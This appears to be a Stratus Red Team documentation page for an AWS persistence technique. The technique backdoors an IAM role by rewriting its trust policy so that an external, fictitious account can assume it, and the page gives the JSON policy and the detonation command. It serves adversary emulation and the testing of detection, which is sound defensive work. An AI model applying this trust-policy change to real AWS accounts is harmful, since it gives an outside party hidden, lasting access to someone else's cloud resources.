---
title: Backdoor an IAM Role
---

# Backdoor an IAM Role 

Platform: AWS

## MITRE ATT&CK Tactics


- Persistence

## Description


Establishes persistence by backdooring an existing IAM role, allowing it to be assumed from an external AWS account.

<span style="font-variant: small-caps;">Warm-up</span>: 

- Create an IAM role.

<span style="font-variant: small-caps;">Detonation</span>: 

- Update the assume role policy of the IAM role to backdoor it, making it accessible from an external, fictitious AWS account:

<pre>
<code>
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "ec2.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    },
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::193672423079:root"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
</code>
</pre>


## Instructions

```bash title="Detonate with Stratus Red Team"
stratus detonate aws.persistence.backdoor-iam-role
```